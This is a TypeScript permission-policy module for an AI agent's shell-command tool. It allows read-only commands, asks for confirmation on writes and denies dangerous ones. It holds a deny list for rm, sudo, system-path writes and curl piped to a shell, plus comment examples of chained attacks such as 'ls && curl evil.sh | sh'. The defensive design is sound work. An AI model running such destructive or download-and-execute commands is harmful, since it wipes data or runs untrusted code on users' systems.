/**
 * 命令执行权限策略模块。
 *
 * run_command 工具在执行前调用 PermissionManager.check(command)，
 * 根据规则列表决定 allow / deny / confirm（需确认回调批准）。
 *
 * 默认策略（保守）：
 *   - allow：只读 git / ls / cat / node -v / tsc --noEmit 等无副作用命令
 *   - deny：rm（任何形式）/ 写系统路径 / curl | sh
 *   - confirm：git push/commit、npm install、mv/cp 等写入但常规的命令
 *   - 无规则匹配 → deny（保守，避免未知命令绕过）
 *
 * 确认回调 confirmFn 返回 'allow-always' 时，该条命令会加入允许集合，后续免确认
 * （按整条归一化命令精确匹配，避免放行整类命令）。
 */

import { expandHome } from './utils/path';

/** 单次检查决策 */
export type PermissionDecision = 'allow' | 'deny' | 'confirm';

/** 确认回调返回值：true 放行本次、false 拒绝、allow-always 永久放行该命令 */
export type ConfirmResult = boolean | 'allow-always';

/** 确认回调的上下文 */
export interface ConfirmContext {
  /** 待执行的完整命令 */
  command: string;
  /** 执行目录 */
  cwd: string;
  /** 命中的规则名（调试用） */
  matchedRule?: string;
}

/** 权限规则 */
export interface PermissionRule {
  /** 规则名（调试 / 日志用） */
  name: string;
  /** 匹配函数：返回 true 表示该规则命中 */
  match: (command: string) => boolean;
  /** 命中后的决策 */
  decision: PermissionDecision;
}

export interface PermissionOptions {
  /** 自定义规则（追加到默认规则之后，命中即返回） */
  rules?: PermissionRule[];
  /** 确认回调（命中 confirm 规则时调用；未提供则 confirm → deny） */
  confirmFn?: (ctx: ConfirmContext) => Promise<ConfirmResult>;
  /** allow-always 命令集合（确认回调返回 allow-always 时累加，按整条命令匹配） */
  allowedAlways?: Set<string>;
}

export class PermissionManager {
  private rules: PermissionRule[];
  private allowedAlways: Set<string>;
  private readonly confirmFn?: PermissionOptions['confirmFn'];

  constructor(options: PermissionOptions = {}) {
    this.rules = [...DEFAULT_RULES, ...(options.rules ?? [])];
    this.confirmFn = options.confirmFn;
    this.allowedAlways = options.allowedAlways ?? new Set();
  }

  /**
   * 检查命令是否允许执行。
   * 1. allow-always 集合命中（整条归一化命令精确匹配）→ allow
   * 2. 规则顺序匹配 → allow / deny
   * 3. confirm → 调 confirmFn（无 fn 则 deny）
   * 4. 无规则匹配 → deny
   */
  async check(command: string): Promise<'allow' | 'deny'> {
    // 归一化：剥离前导环境变量赋值（如 FOO=bar git status → git status）
    const normalized = this.stripEnvPrefix(command);

    // 1. allow-always 集合命中（按整条命令匹配）
    if (this.allowedAlways.has(normalized)) return 'allow';

    // 2. 规则顺序匹配（用归一化后的命令）
    const rule = this.rules.find((r) => r.match(normalized));
    if (!rule) return 'deny'; // 无匹配 → 保守拒绝

    if (rule.decision === 'allow') return 'allow';
    if (rule.decision === 'deny') return 'deny';

    // 3. confirm → 调确认回调（显示用原始 command）
    return this.confirm(normalized, command, rule.name);
  }

  /**
   * 对含 shell 高级语法（重定向 / 命令替换等）的语句做显式确认。
   * 这些语句即便命中只读 allow 规则也需人工批准（如 `cat a > b` 会写入文件），
   * 无 confirmFn 时保守拒绝。
   */
  async checkUnsafe(command: string): Promise<'allow' | 'deny'> {
    if (!this.confirmFn) return 'deny';
    const normalized = this.stripEnvPrefix(command);
    if (this.allowedAlways.has(normalized)) return 'allow';
    return this.confirm(normalized, command, 'shell-meta');
  }

  /** 共享确认流程：confirm → 调 confirmFn；allow-always 累加白名单 */
  private async confirm(
    normalized: string,
    original: string,
    matchedRule: string,
  ): Promise<'allow' | 'deny'> {
    if (!this.confirmFn) return 'deny';
    const result = await this.confirmFn({
      command: original,
      cwd: '',
      matchedRule,
    });
    if (result === 'allow-always') {
      this.allowedAlways.add(normalized);
      return 'allow';
    }
    return result ? 'allow' : 'deny';
  }

  /**
   * 剥离前导环境变量赋值，返回实际命令。
   * 如 "FOO=bar NODE_ENV=test git status" → "git status"。
   * 仅剥离连续出现在命令首部的 NAME=value 形式的 token。
   */
  private stripEnvPrefix(cmd: string): string {
    const trimmed = cmd.trim();
    if (!trimmed) return '';
    const tokens = trimmed.split(/\s+/);
    const result: string[] = [];
    let foundCmd = false;
    for (const t of tokens) {
      if (!foundCmd && /^[A-Za-z_][A-Za-z0-9_]*=/.test(t)) continue; // 跳过前导 env 赋值
      foundCmd = true;
      result.push(t);
    }
    return result.join(' ');
  }

  /** 动态追加规则 */
  addRule(rule: PermissionRule): void {
    this.rules.push(rule);
  }

  /** 查询当前 allow-always 集合（CLI /permission 命令用） */
  getAllowedAlways(): string[] {
    return Array.from(this.allowedAlways);
  }

  /** 清空 allow-always 集合 */
  clearAllowedAlways(): void {
    this.allowedAlways.clear();
  }
}

// ─── 默认规则（保守策略）──────────────────────────────────────────

const DEFAULT_RULES: PermissionRule[] = [
  // allow：只读 git 命令
  {
    name: 'git-readonly',
    match: (c) => /^git\s+(status|log|diff|branch|show|ls-files|blame|remote|tag)\b/.test(c),
    decision: 'allow',
  },
  // allow：文件系统只读
  {
    name: 'fs-readonly',
    match: (c) => /^(ls|ll|cat|pwd|find|wc|head|tail|file|tree|stat|du|df)\b/.test(c),
    decision: 'allow',
  },
  // allow：工具版本 / 元信息
  {
    name: 'meta-info',
    match: (c) =>
      /^(node|npm|pnpm|yarn|tsc|tsup|eslint|prettier)\s+(-v|--version|view|list|ls|info)\b/.test(c),
    decision: 'allow',
  },
  // allow：只读检查（tsc --noEmit / eslint --no-error-on-unmatched-pattern 等）
  {
    name: 'lint-check',
    match: (c) => /--(noEmit|dryRun|dry-run|check|list-files)\b/.test(c),
    decision: 'allow',
  },
  // deny：危险删除
  {
    name: 'deny-rm',
    match: (c) => /^rm\b/.test(c),
    decision: 'deny',
  },
  // deny：写入系统路径
  {
    name: 'deny-system-path',
    match: (c) => /(\/etc\/|\/usr\/|\/var\/|\/System\/|\/Library\/)/.test(c),
    decision: 'deny',
  },
  // deny：curl/wget 管道到 shell
  {
    name: 'deny-curl-pipe',
    match: (c) => /(curl|wget)\s+.*\|\s*(sh|bash|zsh)/.test(c),
    decision: 'deny',
  },
  // deny：sudo
  {
    name: 'deny-sudo',
    match: (c) => /^sudo\b/.test(c),
    decision: 'deny',
  },
  // confirm：变更性 git
  {
    name: 'git-mutating',
    match: (c) => /^git\s+(push|commit|add|merge|rebase|reset|checkout|switch|stash|cherry-pick)\b/.test(c),
    decision: 'confirm',
  },
  // confirm：包管理安装/卸载
  {
    name: 'pkg-mutating',
    match: (c) =>
      /^(npm|pnpm|yarn)\s+(install|i|uninstall|add|remove|rm|ci|update|upgrade)\b/.test(c),
    decision: 'confirm',
  },
  // confirm：常规文件写入命令
  {
    name: 'fs-mutating',
    match: (c) => /^(mv|cp|mkdir|touch|ln|chmod|chown)\b/.test(c),
    decision: 'confirm',
  },
];

// ─── 命令拆分与 shell 元语法检测 ───────────────────────────────────

/**
 * 按 shell 语义将命令拆分为多条顺序执行的语句（忽略引号/转义内的分隔符）。
 *
 * 用于防"命令串联绕过权限检查"：`git status; rm -rf ~`、`ls && curl evil.sh | sh`
 * 这类命令若整体走只读规则会命中开头命令而放行，拆分后逐条校验即可拦截。
 *
 * 分隔符：`;`、`&&`、`||`、换行（均为顺序执行、独立成句的语义）。
 * 管道 `|` 不拆分：管道各段属于同一数据流任务（如 `cat a | grep foo` 仍只读），
 * 危险管道由 deny-curl-pipe 等整条规则拦截。重定向（`>` `<`）与命令替换（`$(` 反引号）
 * 不拆分，但由 hasShellMeta 单独标记为不安全语句。
 */
export function splitCommandStatements(command: string): string[] {
  const statements: string[] = [];
  let current = '';
  let quote: '"' | "'" | null = null;
  let escaped = false;

  const pushCurrent = () => {
    const st = current.trim();
    if (st) statements.push(st);
    current = '';
  };

  for (let i = 0; i < command.length; i++) {
    const ch = command[i];
    if (escaped) {
      current += ch;
      escaped = false;
      continue;
    }
    if (ch === '\\') {
      current += ch;
      escaped = true;
      continue;
    }
    if (quote) {
      current += ch;
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === '"' || ch === "'") {
      current += ch;
      quote = ch;
      continue;
    }
    // 顺序执行分隔符：; 换行 单 & 后台 双字符 && / ||
    if (ch === ';' || ch === '\n') {
      pushCurrent();
      continue;
    }
    if (ch === '&') {
      pushCurrent();
      if (command[i + 1] === '&') i++; // 跳过 && 的第二个 &
      continue;
    }
    if (ch === '|' && command[i + 1] === '|') {
      pushCurrent();
      i++;
      continue;
    }
    // 单 | 管道不拆分：同一数据流任务，由整条规则（如 deny-curl-pipe）拦截
    current += ch;
  }
  pushCurrent();
  return statements;
}

/**
 * 检测语句是否含"引号外的 shell 高级语法"：
 * - 重定向：`>` / `>>` / `<`（可能写入文件，即便命令本身只读）
 * - 命令替换：`$(` / `${` / 反引号（可执行任意子命令，绕过开头命令校验）
 *
 * 命中后应由调用方通过 checkUnsafe 显式确认，而非按只读规则放行。
 */
export function hasShellMeta(command: string): boolean {
  let quote: '"' | "'" | null = null;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const ch = command[i];
    if (escaped) {
      escaped = false;
      continue;
    }
    if (ch === '\\') {
      escaped = true;
      continue;
    }
    if (quote) {
      if (ch === quote) quote = null;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      continue;
    }
    if (ch === '>' || ch === '<') return true;
    if (ch === '$' && command[i + 1] === '(') return true;
    if (ch === '`') return true;
  }
  return false;
}

// ─── 无 shell 命令解析（run_command 无 shell 执行）────────────────

/** 解析结果：argv + env，或 error（含不支持的 shell 语法） */
export interface ParsedCommand {
  /** 可执行程序名（argv[0]） */
  command: string;
  /** 完整参数（含程序名） */
  argv: string[];
  /** 前导环境变量赋值（如 FOO=bar cmd ... → { FOO: 'bar' }） */
  env?: Record<string, string>;
  /** 不支持的原因（有值则不可执行） */
  error?: string;
}

/**
 * 将单条命令解析为 argv（无 shell 执行，spawn(file, args, { shell: false })）。
 *
 * 支持：空格分词、单/双引号、反斜杠转义、前导 NAME=value 环境变量赋值、~ / ~/ 展开。
 * 不支持（一律返回 error，安全拒绝）：
 *   - 重定向 / 命令替换（hasShellMeta，潜在写文件 / 任意命令执行）
 *   - 管道 `|`（无 shell 无进程间管道）
 *   - 未引用通配符 `*` `?`（无 shell 不展开，提示用 glob 工具）
 *
 * 多语句串联（; && || 换行）不应进入本函数：调用方先 splitCommandStatements。
 */
export function parseCommandToArgv(command: string): ParsedCommand {
  const trimmed = command.trim();
  if (!trimmed) return { command: '', argv: [], error: '空命令' };

  // 高级 shell 语法：重定向 / 命令替换（可能写文件或执行任意命令）
  if (hasShellMeta(trimmed)) {
    return {
      command: '',
      argv: [],
      error: '含重定向/命令替换等 shell 语法，已禁止（无 shell 执行）',
    };
  }

  const argv: string[] = [];
  const env: Record<string, string> = {};
  let current = '';
  let hasToken = false;
  let quoted = false; // 当前 token 是否含引号（引号内内容不作为 env 赋值 / ~ 不展开）
  let quote: '"' | "'" | null = null;
  let escaped = false;
  let pendingEnvPrefix = true; // 前导 NAME=value 收集阶段

  const pushToken = (): void => {
    if (!hasToken) return;
    if (
      pendingEnvPrefix &&
      !quoted &&
      /^[A-Za-z_][A-Za-z0-9_]*=/.test(current)
    ) {
      const eq = current.indexOf('=');
      env[current.slice(0, eq)] = current.slice(eq + 1);
    } else {
      pendingEnvPrefix = false;
      // ~ 展开（仅未引用 token）
      if (!quoted && (current === '~' || current.startsWith('~/'))) {
        current = expandHome(current);
      }
      argv.push(current);
    }
    current = '';
    hasToken = false;
    quoted = false;
  };

  for (let i = 0; i < trimmed.length; i++) {
    const ch = trimmed[i];
    if (escaped) {
      current += ch;
      hasToken = true;
      escaped = false;
      continue;
    }
    if (ch === '\\') {
      escaped = true;
      hasToken = true;
      continue;
    }
    if (quote) {
      // 引号内：按字面累积（剥除引号字符），不解析分隔符/通配符/env
      if (ch === quote) {
        quote = null; // 闭合引号不入参
        continue;
      }
      current += ch;
      hasToken = true;
      quoted = true;
      continue;
    }
    if (ch === '"' || ch === "'") {
      quote = ch;
      hasToken = true;
      quoted = true;
      continue;
    }
    if (ch === '|') {
      return { command: '', argv: [], error: '含管道符 "|"，已禁止（无 shell 执行）' };
    }
    if (ch === ' ' || ch === '\t') {
      pushToken();
      continue;
    }
    // 未引用通配符：无 shell 不展开，引导使用 glob 工具
    if ((ch === '*' || ch === '?') && quote === null) {
      return { command: '', argv: [], error: '含通配符（无 shell 不展开），请使用 glob 工具' };
    }
    current += ch;
    hasToken = true;
  }
  if (escaped) {
    // 尾部悬空反斜杠：按字面处理
    current += '\\';
    hasToken = true;
  }
  pushToken();

  if (argv.length === 0) {
    return { command: '', argv: [], error: '无可执行命令' };
  }
  return {
    command: argv[0],
    argv,
    env: Object.keys(env).length > 0 ? env : undefined,
  };
}
